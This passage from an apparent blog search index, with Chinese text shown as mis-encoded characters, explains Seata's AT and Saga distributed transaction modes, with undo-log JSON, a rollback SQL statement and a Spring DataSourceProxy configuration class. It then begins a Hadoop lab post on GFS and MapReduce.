class="string">&quot;since&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2014&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;beforeImage&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;rows&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TXC&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;since&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2014&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;tableName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;product&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;sqlType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UPDATE&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;xid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xid:xxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>æäº¤å‰ï¼Œå‘ TC æ³¨å†Œåˆ†æ”¯ï¼šç”³è¯· <code>product</code> è¡¨ä¸­ï¼Œä¸»é”®å€¼ç­‰äº 1 çš„è®°å½•çš„ <strong>å…¨å±€é”</strong> ã€‚</li>
<li>æœ¬åœ°äº‹åŠ¡æäº¤ï¼šä¸šåŠ¡æ•°æ®çš„æ›´æ–°å’Œå‰é¢æ­¥éª¤ä¸­ç”Ÿæˆçš„ UNDO LOG ä¸€å¹¶æäº¤ã€‚</li>
<li>å°†æœ¬åœ°äº‹åŠ¡æäº¤çš„ç»“æœä¸ŠæŠ¥ç»™ TCã€‚</li>
</ol>
<blockquote>
<h4 id="äºŒé˜¶æ®µ-å›æ»š"><a href="#äºŒé˜¶æ®µ-å›æ»š" class="headerlink" title="äºŒé˜¶æ®µ-å›æ»š"></a>äºŒé˜¶æ®µ-å›æ»š</h4></blockquote>
<ol>
<li>æ”¶åˆ° TC çš„åˆ†æ”¯å›æ»šè¯·æ±‚ï¼Œå¼€å¯ä¸€ä¸ªæœ¬åœ°äº‹åŠ¡ï¼Œæ‰§è¡Œå¦‚ä¸‹æ“ä½œã€‚</li>
<li>é€šè¿‡ XID å’Œ Branch ID æŸ¥æ‰¾åˆ°ç›¸åº”çš„ UNDO LOG è®°å½•ã€‚</li>
<li>æ•°æ®æ ¡éªŒï¼šæ‹¿ UNDO LOG ä¸­çš„åé•œä¸å½“å‰æ•°æ®è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæœ‰ä¸åŒï¼Œè¯´æ˜æ•°æ®è¢«å½“å‰å…¨å±€äº‹åŠ¡ä¹‹å¤–çš„åŠ¨ä½œåšäº†ä¿®æ”¹ã€‚è¿™ç§æƒ…å†µï¼Œéœ€è¦æ ¹æ®é…ç½®ç­–ç•¥æ¥åšå¤„ç†ï¼Œè¯¦ç»†çš„è¯´æ˜åœ¨å¦å¤–çš„æ–‡æ¡£ä¸­ä»‹ç»ã€‚</li>
<li>æ ¹æ® UNDO LOG ä¸­çš„å‰é•œåƒå’Œä¸šåŠ¡ SQL çš„ç›¸å…³ä¿¡æ¯ç”Ÿæˆå¹¶æ‰§è¡Œå›æ»šçš„è¯­å¥ï¼š</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> product <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<ol>
<li>æäº¤æœ¬åœ°äº‹åŠ¡ã€‚å¹¶æŠŠæœ¬åœ°äº‹åŠ¡çš„æ‰§è¡Œç»“æœï¼ˆå³åˆ†æ”¯äº‹åŠ¡å›æ»šçš„ç»“æœï¼‰ä¸ŠæŠ¥ç»™ TCã€‚</li>
</ol>
<blockquote>
<h4 id="äºŒé˜¶æ®µ-æäº¤"><a href="#äºŒé˜¶æ®µ-æäº¤" class="headerlink" title="äºŒé˜¶æ®µ-æäº¤"></a>äºŒé˜¶æ®µ-æäº¤</h4></blockquote>
<ol>
<li>æ”¶åˆ° TC çš„åˆ†æ”¯æäº¤è¯·æ±‚ï¼ŒæŠŠè¯·æ±‚æ”¾å…¥ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡çš„é˜Ÿåˆ—ä¸­ï¼Œé©¬ä¸Šè¿”å›æäº¤æˆåŠŸçš„ç»“æœç»™ TCã€‚</li>
<li>å¼‚æ­¥ä»»åŠ¡é˜¶æ®µçš„åˆ†æ”¯æäº¤è¯·æ±‚å°†å¼‚æ­¥å’Œæ‰¹é‡åœ°åˆ é™¤ç›¸åº” UNDO LOG è®°å½•ã€‚</li>
</ol>
<h4 id="ä¼˜ç¼ºç‚¹"><a href="#ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h4><p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ä¸2PCç›¸æ¯”ï¼šæ¯ä¸ªåˆ†æ”¯äº‹åŠ¡éƒ½æ˜¯ç‹¬ç«‹æäº¤ï¼Œä¸äº’ç›¸ç­‰å¾…ï¼Œå‡å°‘äº†èµ„æºé”å®šå’Œé˜»å¡æ—¶é—´</li>
<li>ä¸TCCç›¸æ¯”ï¼šäºŒé˜¶æ®µçš„æ‰§è¡Œæ“ä½œå…¨éƒ¨è‡ªåŠ¨åŒ–ç”Ÿæˆï¼Œæ— ä»£ç ä¾µå…¥ï¼Œå¼€å‘æˆæœ¬ä½</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>ä¸TCCç›¸æ¯”ï¼Œéœ€è¦åŠ¨æ€ç”ŸæˆäºŒé˜¶æ®µçš„åå‘è¡¥å¿æ“ä½œï¼Œæ‰§è¡Œæ€§èƒ½ç•¥ä½äºTCC</li>
</ul>
<h3 id="Sagaæ¨¡å¼"><a href="#Sagaæ¨¡å¼" class="headerlink" title="Sagaæ¨¡å¼"></a>Sagaæ¨¡å¼</h3><p>Saga [ËˆsÉ‘ËÉ¡É™]æ¨¡å¼æ˜¯ Seata å³å°†å¼€æºçš„é•¿äº‹åŠ¡è§£å†³æ–¹æ¡ˆï¼Œå°†ç”±èš‚èšé‡‘æœä¸»è¦è´¡çŒ®ã€‚</p>
<p>å…¶ç†è®ºåŸºç¡€æ˜¯Hector&amp;Kennethåœ¨1987å¹´å‘è¡¨çš„è®ºæ–‡<a href="https://microservices.io/patterns/data/saga.html">Sagas</a>ã€‚</p>
<p>Seataå®˜ç½‘å¯¹äºSagaçš„æŒ‡å—ï¼š<a href="https://seata.io/zh-cn/docs/user/saga.html">https://seata.io/zh-cn/docs/user/saga.html</a></p>
<h4 id="åŸºæœ¬æ¨¡å‹"><a href="#åŸºæœ¬æ¨¡å‹" class="headerlink" title="åŸºæœ¬æ¨¡å‹"></a>åŸºæœ¬æ¨¡å‹</h4><p>åœ¨ Saga æ¨¡å¼ä¸‹ï¼Œåˆ†å¸ƒå¼äº‹åŠ¡å†…æœ‰å¤šä¸ªå‚ä¸è€…ï¼Œæ¯ä¸€ä¸ªå‚ä¸è€…éƒ½æ˜¯ä¸€ä¸ªå†²æ­£è¡¥å¿æœåŠ¡ï¼Œéœ€è¦ç”¨æˆ·æ ¹æ®ä¸šåŠ¡åœºæ™¯å®ç°å…¶æ­£å‘æ“ä½œå’Œé€†å‘å›æ»šæ“ä½œã€‚</p>
<p>åˆ†å¸ƒå¼äº‹åŠ¡æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¾æ¬¡æ‰§è¡Œå„å‚ä¸è€…çš„æ­£å‘æ“ä½œï¼Œå¦‚æœæ‰€æœ‰æ­£å‘æ“ä½œå‡æ‰§è¡ŒæˆåŠŸï¼Œé‚£ä¹ˆåˆ†å¸ƒå¼äº‹åŠ¡æäº¤ã€‚å¦‚æœä»»ä½•ä¸€ä¸ªæ­£å‘æ“ä½œæ‰§è¡Œå¤±è´¥ï¼Œé‚£ä¹ˆåˆ†å¸ƒå¼äº‹åŠ¡ä¼šå»é€€å›å»æ‰§è¡Œå‰é¢å„å‚ä¸è€…çš„é€†å‘å›æ»šæ“ä½œï¼Œå›æ»šå·²æäº¤çš„å‚ä¸è€…ï¼Œä½¿åˆ†å¸ƒå¼äº‹åŠ¡å›åˆ°åˆå§‹çŠ¶æ€ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022733.png" alt="Saga æ¨¡å¼"> </p>
<p>Saga æ¨¡å¼ä¸‹åˆ†å¸ƒå¼äº‹åŠ¡é€šå¸¸æ˜¯ç”±äº‹ä»¶é©±åŠ¨çš„ï¼Œå„ä¸ªå‚ä¸è€…ä¹‹é—´æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼ŒSaga æ¨¡å¼æ˜¯ä¸€ç§é•¿äº‹åŠ¡è§£å†³æ–¹æ¡ˆã€‚</p>
<h4 id="é€‚ç”¨åœºæ™¯"><a href="#é€‚ç”¨åœºæ™¯" class="headerlink" title="é€‚ç”¨åœºæ™¯"></a>é€‚ç”¨åœºæ™¯</h4><ul>
<li>ä¸šåŠ¡æµç¨‹é•¿ã€ä¸šåŠ¡æµç¨‹å¤š</li>
<li>å‚ä¸è€…åŒ…å«å…¶å®ƒå…¬å¸æˆ–é—ç•™ç³»ç»ŸæœåŠ¡ï¼Œæ— æ³•æä¾› TCC æ¨¡å¼è¦æ±‚çš„ä¸‰ä¸ªæ¥å£</li>
</ul>
<h4 id="ä¼˜åŠ¿"><a href="#ä¼˜åŠ¿" class="headerlink" title="ä¼˜åŠ¿"></a>ä¼˜åŠ¿</h4><ul>
<li>ä¸€é˜¶æ®µæäº¤æœ¬åœ°äº‹åŠ¡ï¼Œæ— é”ï¼Œé«˜æ€§èƒ½</li>
<li>äº‹ä»¶é©±åŠ¨æ¶æ„ï¼Œå‚ä¸è€…å¯å¼‚æ­¥æ‰§è¡Œï¼Œé«˜åå</li>
<li>è¡¥å¿æœåŠ¡æ˜“äºå®ç°</li>
</ul>
<h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><ul>
<li>ä¸ä¿è¯éš”ç¦»æ€§ï¼ˆåº”å¯¹æ–¹æ¡ˆè§<a href="https://seata.io/zh-cn/docs/user/saga.html">ç”¨æˆ·æ–‡æ¡£</a>ï¼‰</li>
</ul>
<h2 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a>Seata</h2><p>Seataï¼ˆSimple Extensible Autonomous Transaction Architectureï¼Œç®€å•å¯æ‰©å±•è‡ªæ²»äº‹åŠ¡æ¡†æ¶ï¼‰æ˜¯ 2019 å¹´ 1 æœˆä»½èš‚èšé‡‘æœå’Œé˜¿é‡Œå·´å·´å…±åŒå¼€æºçš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆã€‚Seata å¼€æºåŠå¹´å·¦å³ï¼Œç›®å‰å·²ç»æœ‰æ¥è¿‘ä¸€ä¸‡ starï¼Œç¤¾åŒºéå¸¸æ´»è·ƒã€‚æˆ‘ä»¬çƒ­å¿±æ¬¢è¿å¤§å®¶å‚ä¸åˆ° Seata ç¤¾åŒºå»ºè®¾ä¸­ï¼Œä¸€åŒå°† Seata æ‰“é€ æˆå¼€æºåˆ†å¸ƒå¼äº‹åŠ¡æ ‡æ†äº§å“ã€‚</p>
<p>Seataï¼š<a href="https://github.com/seata/seata">https:&#x2F;&#x2F;</a><a href="https://github.com/seata/seata">github.com&#x2F;seata&#x2F;seata</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022734.png" alt="image-20210415162035629"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022735.png" alt="image-20210415162052256"></p>
<h3 id="ATæ¨¡å¼å®æˆ˜"><a href="#ATæ¨¡å¼å®æˆ˜" class="headerlink" title="ATæ¨¡å¼å®æˆ˜"></a>ATæ¨¡å¼å®æˆ˜</h3><p>é¦–å…ˆåœ¨application.ymlä¸­æ·»åŠ ä¸€è¡Œé…ç½®ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">alibaba:</span></span><br><span class="line">      <span class="attr">seata:</span></span><br><span class="line">        <span class="attr">tx-service-group:</span> <span class="string">test_tx_group</span> <span class="comment"># å®šä¹‰äº‹åŠ¡ç»„çš„åç§°</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯å®šä¹‰äº‹åŠ¡ç»„çš„åç§°ï¼Œæ¥ä¸‹æ¥ä¼šç”¨åˆ°ã€‚</p>
<p>ç„¶åæ˜¯åœ¨<code>resources</code>ç›®å½•ä¸‹æ”¾ä¸¤ä¸ªé…ç½®æ–‡ä»¶ï¼š<code>file.conf</code>å’Œ<code>registry.conf</code></p>
<p>å…¶ä¸­ï¼Œ<code>registry.conf</code>ä¸TCæœåŠ¡ç«¯çš„ä¸€æ ·ï¼Œæ­¤å¤„ä¸å†è®²è§£ã€‚</p>
<p>Seataçš„äºŒé˜¶æ®µæ‰§è¡Œæ˜¯é€šè¿‡æ‹¦æˆªsqlè¯­å¥ï¼Œåˆ†æè¯­ä¹‰æ¥æŒ‡å®šå›æ»šç­–ç•¥ï¼Œå› æ­¤éœ€è¦å¯¹DataSourceåšä»£ç†ã€‚æˆ‘ä»¬åœ¨é¡¹ç›®çš„<code>cn.itcast.order.config</code>åŒ…ä¸­ï¼Œæ·»åŠ ä¸€ä¸ªé…ç½®ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.order.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.datasource.DataSourceProxy;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataSourceProxyConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SqlSessionFactory <span class="title function_">sqlSessionFactoryBean</span><span class="params">(DataSource dataSource)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// è®¢å•æœåŠ¡ä¸­å¼•å…¥äº†mybatis-plusï¼Œæ‰€ä»¥è¦ä½¿ç”¨ç‰¹æ®Šçš„SqlSessionFactoryBean</span></span><br><span class="line">        <span class="type">MybatisSqlSessionFactoryBean</span> <span class="variable">sqlSessionFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisSqlSessionFactoryBean</span>();</span><br><span class="line">        <span class="comment">// ä»£ç†æ•°æ®æº</span></span><br><span class="line">        sqlSessionFactoryBean.setDataSource(<span class="keyword">new</span> <span class="title class_">DataSourceProxy</span>(dataSource));</span><br><span class="line">        <span class="comment">// ç”ŸæˆSqlSessionFactory</span></span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean.getObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œè¿™é‡Œå› ä¸ºè®¢å•æœåŠ¡ä½¿ç”¨äº†mybatis-plusè¿™ä¸ªæ¡†æ¶ï¼ˆè¿™æ˜¯ä¸€ä¸ªmybatisé›†æˆæ¡†æ¶ï¼Œè‡ªåŠ¨ç”Ÿæˆå•è¡¨Sqlï¼‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç”¨mybatis-plusçš„<code>MybatisSqlSessionFactoryBean</code>ä»£æ›¿<code>SqlSessionFactoryBean</code></p>
<p>å¦‚æœç”¨çš„æ˜¯åŸç”Ÿçš„mybatisï¼Œè¯·ä½¿ç”¨<code>SqlSessionFactoryBean</code>ã€‚</p>
<p>æ·»åŠ äº‹åŠ¡æ³¨è§£</p>
<p>ç»™äº‹åŠ¡å‘èµ·è€…<code>order_service</code>çš„<code>OrderServiceImpl</code>ä¸­çš„<code>createOrder()</code>æ–¹æ³•æ·»åŠ <code>@GlobalTransactional</code>æ³¨è§£ï¼Œå¼€å¯å…¨å±€äº‹åŠ¡</p>
<h1 id="å¾®ä¿¡æ”¯ä»˜-1"><a href="#å¾®ä¿¡æ”¯ä»˜-1" class="headerlink" title="å¾®ä¿¡æ”¯ä»˜"></a>å¾®ä¿¡æ”¯ä»˜</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022736.png" alt="image-20210415162630464"></p>
]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyo</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-1 Hadoopç¯å¢ƒå®‰è£…</title>
    <url>/2021/12/22/%E5%A4%A7%E6%95%B0%E6%8D%AE/Lab-1%20Hadoop%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="Lab-1-Hadoopç¯å¢ƒå®‰è£…"><a href="#Lab-1-Hadoopç¯å¢ƒå®‰è£…" class="headerlink" title="Lab-1 Hadoopç¯å¢ƒå®‰è£…"></a>Lab-1 Hadoopç¯å¢ƒå®‰è£…</h1><h2 id="ä¸€ã€å®éªŒåŸç†åˆ†æ"><a href="#ä¸€ã€å®éªŒåŸç†åˆ†æ" class="headerlink" title="ä¸€ã€å®éªŒåŸç†åˆ†æ"></a>ä¸€ã€å®éªŒåŸç†åˆ†æ</h2><h3 id="Hadoopæ˜¯ä»€ä¹ˆ"><a href="#Hadoopæ˜¯ä»€ä¹ˆ" class="headerlink" title="Hadoopæ˜¯ä»€ä¹ˆ"></a>Hadoopæ˜¯ä»€ä¹ˆ</h3><p>Hadoopæ˜¯ä¸€ä¸ªç”±ApacheåŸºé‡‘ä¼šæ‰€å‘å¸ƒçš„åˆ†å¸ƒå¼ç³»ç»ŸåŸºç¡€æ¶æ„ï¼Œä¸»è¦è§£å†³æµ·é‡æ•°æ®çš„å­˜å‚¨å’Œæµ·é‡æ•°æ®çš„åˆ†æè®¡ç®—é—®é¢˜ï¼Œå¹¿ä¹‰æ¥è¯´ï¼ŒHadoopé€šå¸¸æ˜¯æŒ‡ä¸€ä¸ªæ›´å¹¿æ³›çš„æ¦‚å¿µâ€”â€”Hadoopç”Ÿæ€åœˆã€‚</p>
<p>Googleæ˜¯Hadoopçš„æ€æƒ³ä¹‹æºï¼ŒGFS-&gt;HDFSï¼ŒMap-Reduce-&gt;MRï¼ŒBigtable-&gt;HBase</p>
<h3 id="GFSï¼ˆGoogle-File-Systemï¼‰"><a href="#GFSï¼ˆGoogle-File-Systemï¼‰" class="headerlink" title="GFSï¼ˆGoogle-File-Systemï¼‰"></a>GFSï¼ˆGoogle-File-Systemï¼‰</h3><p>ä¸€ä¸ªé¢å‘å¤§è§„æ¨¡æ•°æ®å¯†é›†å‹åº”ç”¨çš„ã€å¯ä¼¸ç¼©çš„åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<ul>
<li>è®¤ä¸ºç»„ä»¶å¤±æ•ˆæ˜¯ä¸€ç§å¸¸æ€ï¼Œæä¾›äº†å®¹é”™æœºåˆ¶ï¼Œè‡ªåŠ¨è´Ÿè½½å‡è¡¡ï¼Œä½¿å¾—åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿå¯ä»¥åœ¨å»‰ä»·æœºå™¨ä¸Šè¿è¡Œ</li>
<li>é¢å‘å¤§æ–‡ä»¶å­˜å‚¨ï¼Œæ–‡ä»¶é€šå¸¸åœ¨100MBæˆ–è€…ä»¥ä¸Šï¼Œæ•°ä¸ªGBå¤§å°çš„æ–‡ä»¶ä¹Ÿæ˜¯æ™®éå­˜åœ¨çš„</li>
<li>ç»å¤§éƒ¨åˆ†æ–‡ä»¶çš„ä¿®æ”¹æ˜¯é‡‡ç”¨åœ¨æ–‡ä»¶å°¾éƒ¨è¿½åŠ æ•°æ®ï¼Œå¾ˆå°‘æœ‰éšæœºå†™</li>
<li>åº”ç”¨ç¨‹åºå’Œæ–‡ä»¶ç³»ç»Ÿ API çš„ååŒè®¾è®¡æé«˜äº†æ•´ä¸ªç³»ç»Ÿçš„çµæ´»æ€§</li>
</ul>
<h4 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h4><p>ä¸€ä¸ª GFS é›†ç¾¤åŒ…å«ä¸€ä¸ªå•ç‹¬çš„ Master èŠ‚ç‚¹ã€å¤šå° Chunk æœåŠ¡å™¨ï¼Œå¹¶ä¸”åŒæ—¶è¢«å¤šä¸ªå®¢æˆ·ç«¯è®¿é—®ï¼Œå¦‚å›¾ æ‰€ç¤ºã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046843.png" alt="img"></p>
<h3 id="Map-Reduce"><a href="#Map-Reduce" class="headerlink" title="Map-Reduce"></a>Map-Reduce</h3><p>æ€»çš„æ¥è®²ï¼ŒGoogle MapReduce æ‰€æ‰§è¡Œçš„åˆ†å¸ƒå¼è®¡ç®—ä¼šä»¥ä¸€ç»„é”®å€¼å¯¹ä½œä¸ºè¾“å…¥ï¼Œè¾“å‡ºå¦ä¸€ç»„é”®å€¼å¯¹ï¼Œç”¨æˆ·åˆ™é€šè¿‡ç¼–å†™ Map å‡½æ•°å’Œ Reduce å‡½æ•°æ¥æŒ‡å®šæ‰€è¦è¿›è¡Œçš„è®¡ç®—ã€‚</p>
<p>ç”±ç”¨æˆ·ç¼–å†™çš„Map å‡½æ•°å°†è¢«åº”ç”¨åœ¨æ¯ä¸€ä¸ªè¾“å…¥é”®å€¼å¯¹ä¸Šï¼Œå¹¶è¾“å‡ºè‹¥å¹²é”®å€¼å¯¹ä½œä¸ºä¸­é—´ç»“æœã€‚ä¹‹åï¼ŒMapReduce æ¡†æ¶åˆ™ä¼šå°†ä¸åŒä¸€ä¸ªé”®$I$ç›¸å…³è”çš„å€¼éƒ½ä¼ é€’åˆ°åŒä¸€æ¬¡ Reduce å‡½æ•°è°ƒç”¨ä¸­ã€‚</p>
<p>åŒæ ·ç”±ç”¨æˆ·ç¼–å†™çš„ Reduce å‡½æ•°ä»¥é”®$I$ä»¥åŠä¸è¯¥é”®ç›¸å…³è”çš„å€¼çš„é›†åˆä½œä¸ºå‚æ•°ï¼Œå¯¹ä¼ å…¥çš„å€¼è¿›è¡Œåˆå¹¶å¹¶è¾“å‡ºåˆå¹¶åçš„å€¼çš„é›†åˆã€‚</p>
<h4 id="Map-Reduceè®¡ç®—è¿‡ç¨‹"><a href="#Map-Reduceè®¡ç®—è¿‡ç¨‹" class="headerlink" title="Map-Reduceè®¡ç®—è¿‡ç¨‹"></a>Map-Reduceè®¡ç®—è¿‡ç¨‹</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220046858.jpg" alt="preview"></p>
<p>é¦–å…ˆï¼Œç”¨æˆ·é€šè¿‡ MapReduce å®¢æˆ·ç«¯æŒ‡å®š Map å‡½æ•°å’Œ Reduce å‡½æ•°ï¼Œä»¥åŠæ­¤æ¬¡ MapReduce è®¡ç®—çš„é…ç½®ï¼ŒåŒ…æ‹¬ä¸­é—´ç»“æœé”®å€¼å¯¹çš„ Partition æ•°é‡ $R$ä»¥åŠç”¨äºåˆ‡åˆ†ä¸­é—´ç»“æœçš„å“ˆå¸Œå‡½æ•°$hash$<br>ç”¨æˆ·å¼€å§‹ MapReduce è®¡ç®—åï¼Œæ•´ä¸ª MapReduce è®¡ç®—çš„æµç¨‹å¯æ€»ç»“å¦‚ä¸‹ï¼š</p>
<ol>
<li>ä½œä¸ºè¾“å…¥çš„æ–‡ä»¶ä¼šè¢«åˆ†ä¸º$M$ä¸ª Splitï¼Œæ¯ä¸ª Split çš„å¤§å°é€šå¸¸åœ¨ 16~64 MB ä¹‹é—´</li>
<li>å¦‚æ­¤ï¼Œæ•´ä¸ª MapReduce è®¡ç®—åŒ…å«$M$ä¸ªMap ä»»åŠ¡å’Œ $R$ä¸ª Reduce ä»»åŠ¡ã€‚Master ç»“ç‚¹ä¼šä»ç©ºé—²çš„ Worker ç»“ç‚¹ä¸­è¿›è¡Œé€‰å–å¹¶ä¸ºå…¶åˆ†é… Map ä»»åŠ¡å’Œ Reduce ä»»åŠ¡</li>
<li>æ”¶åˆ° Map ä»»åŠ¡çš„ Worker ä»¬ï¼ˆåˆç§° Mapperï¼‰å¼€å§‹è¯»å…¥è‡ªå·±å¯¹åº”çš„ Splitï¼Œå°†è¯»å…¥çš„å†…å®¹è§£æä¸ºè¾“å…¥é”®å€¼å¯¹å¹¶è°ƒç”¨ç”±ç”¨æˆ·å®šä¹‰çš„ Map å‡½æ•°ã€‚ç”± Map å‡½æ•°äº§ç”Ÿçš„ä¸­é—´ç»“æœé”®å€¼å¯¹ä¼šè¢«æš‚æ—¶å­˜æ”¾åœ¨ç¼“å†²å†…å­˜åŒºä¸­</li>
<li>åœ¨ Map é˜¶æ®µè¿›è¡Œçš„åŒæ—¶ï¼ŒMapper ä»¬å‘¨æœŸæ€§åœ°å°†æ”¾ç½®åœ¨ç¼“å†²åŒºä¸­çš„ä¸­é—´ç»“æœå­˜å…¥åˆ°è‡ªå·±çš„æœ¬åœ°ç£ç›˜ä¸­ï¼ŒåŒæ—¶æ ¹æ®ç”¨æˆ·æŒ‡å®šçš„ Partition å‡½æ•°ï¼ˆé»˜è®¤ä¸º $hash(key) mod R$ ï¼‰å°†äº§ç”Ÿçš„ä¸­é—´ç»“æœåˆ†ä¸º$R$ ä¸ªéƒ¨åˆ†ã€‚ä»»åŠ¡å®Œæˆæ—¶ï¼ŒMapper ä¾¿ä¼šå°†ä¸­é—´ç»“æœåœ¨å…¶æœ¬åœ°ç£ç›˜ä¸Šçš„å­˜æ”¾ä½ç½®æŠ¥å‘Šç»™ Master</li>
<li>Mapper ä¸ŠæŠ¥çš„ä¸­é—´ç»“æœå­˜æ”¾ä½ç½®ä¼šè¢« Master è½¬å‘ç»™ Reducerã€‚å½“ Reducer æ¥æ”¶åˆ°è¿™äº›ä¿¡æ¯åä¾¿ä¼šé€šè¿‡ RPC è¯»å–å­˜å‚¨åœ¨ Mapper æœ¬åœ°ç£ç›˜ä¸Šå±äºå¯¹åº” Partition çš„ä¸­é—´ç»“æœã€‚åœ¨è¯»å–å®Œæ¯•åï¼ŒReducer ä¼šå¯¹è¯»å–åˆ°çš„æ•°æ®è¿›è¡Œæ’åºä»¥ä»¤æ‹¥æœ‰ç›¸åŒé”®çš„é”®å€¼å¯¹èƒ½å¤Ÿè¿ç»­åˆ†å¸ƒ</li>
